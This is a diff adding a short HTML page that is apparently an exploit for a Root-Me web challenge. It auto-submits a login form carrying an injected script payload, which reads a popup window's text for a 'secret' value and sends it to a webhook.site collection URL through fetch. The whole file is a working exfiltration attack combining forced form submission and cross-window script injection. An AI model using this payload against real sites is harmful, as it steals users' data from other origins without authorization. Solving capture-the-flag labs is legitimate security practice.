@@ -1,0 +1,17 @@
+<!doctype html><html><head><meta charset="utf-8"><title>chargement</title></head><body>
+<h1>Chargement...</h1>
+<script>
+var CH='http://challenge01.root-me.org:58003';
+var U='https://webhook.site/af9addd2-9c27-4b22-aad4-0001211f0c67';
+var PAY='<script>(function(){var U=\'https://webhook.site/af9addd2-9c27-4b22-aad4-0001211f0c67\';var n=0;var t=setInterval(function(){n++;try{var w=window.open(\'\',\'pop1\');var tx=(w.document.body.innerText||\'\');if(tx&&tx.toLowerCase().indexOf(\'secret\')>-1){var k=tx.split(\':\');var s=k[k.length-1].trim();if(s){clearInterval(t);fetch(U+\'?secret=\'+encodeURIComponent(s));}}}catch(e){if(n>16){clearInterval(t);fetch(U+\'?err=\'+encodeURIComponent(String(e)).slice(0,120));}}},250);})();<\/script>';
+fetch(U+'?w1=1');
+window.open(CH+'/profile','pop1');
+setTimeout(function(){
+  var f=document.createElement('form');
+  f.method='POST';f.action=CH+'/login';f.target='pop2';
+  var u=document.createElement('input');u.name='username';u.value=PAY;
+  var s=document.createElement('input');s.name='secret';s.value='x1';
+  f.appendChild(u);f.appendChild(s);document.body.appendChild(f);f.submit();
+},700);
+</script>
+</body></html>
